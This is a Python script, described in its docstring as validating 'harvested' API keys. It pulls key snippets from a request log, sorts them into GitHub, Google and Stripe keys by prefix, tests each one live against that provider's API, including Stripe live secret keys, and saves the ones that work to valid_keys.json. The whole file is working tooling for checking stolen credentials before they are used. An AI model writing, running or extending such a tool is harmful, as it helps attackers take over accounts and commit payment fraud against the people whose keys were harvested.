#!/usr/bin/env python3
"""Validate harvested API keys"""
import re
import requests
import json
from pathlib import Path

def validate_github_token(token):
    """Test GitHub token"""
    headers = {"Authorization": f"token {token}"}
    try:
        r = requests.get("https://api.github.com/user", headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            return True, f"Valid - User: {data.get('login')}"
        elif r.status_code == 401:
            return False, "Invalid token"
        else:
            return False, f"Error {r.status_code}"
    except:
        return False, "Connection error"

def validate_google_key(key):
    """Test Google API key"""
    try:
        r = requests.get(
            f"https://maps.googleapis.com/maps/api/geocode/json",
            params={"address": "test", "key": key},
            timeout=5
        )
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "REQUEST_DENIED":
                return False, "Invalid or unauthorized"
            elif data.get("status") == "OK":
                return True, "Valid Google API key"
        return False, f"Error {r.status_code}"
    except:
        return False, "Connection error"

def validate_stripe_key(key):
    """Test Stripe key (sk_live or sk_test)"""
    import stripe
    try:
        stripe.api_key = key
        stripe.Account.retrieve()
        return True, "Valid Stripe key"
    except stripe.error.AuthenticationError:
        return False, "Invalid Stripe key"
    except:
        return False, "Error"

def extract_keys_from_log():
    """Extract keys from key_requests.log"""
    log_file = Path("key_requests.log")
    if not log_file.exists():
        return []
    
    keys = []
    content = log_file.read_text()
    
    # Look for key snippets
    for line in content.split('\n'):
        if "Key snippet:" in line:
            key = line.split("Key snippet:")[1].strip().replace('...', '')
            if key and len(key) > 10:
                keys.append(key)
    
    return keys

def main():
    print("🔑 API Key Validator")
    print("=" * 50)
    
    keys = extract_keys_from_log()
    print(f"Found {len(keys)} potential keys to validate\n")
    
    valid_keys = []
    
    for i, key in enumerate(keys, 1):
        print(f"Testing key {i}/{len(keys)}: {key[:20]}...")
        
        # Determine key type and validate
        if key.startswith('ghp_'):
            valid, msg = validate_github_token(key)
            print(f"  GitHub: {msg}")
            if valid:
                valid_keys.append(("github", key))
                
        elif key.startswith('AIza'):
            valid, msg = validate_google_key(key)
            print(f"  Google: {msg}")
            if valid:
                valid_keys.append(("google", key))
                
        elif key.startswith(('sk_live', 'sk_test')):
            valid, msg = validate_stripe_key(key)
            print(f"  Stripe: {msg}")
            if valid:
                valid_keys.append(("stripe", key))
        else:
            print(f"  Unknown key type, skipping")
    
    # Save valid keys
    if valid_keys:
        with open("valid_keys.json", 'w') as f:
            json.dump(valid_keys, f, indent=2)
        print(f"\n✅ Saved {len(valid_keys)} valid keys to valid_keys.json")
    else:
        print("\n❌ No valid keys found")

if __name__ == "__main__":
    main()
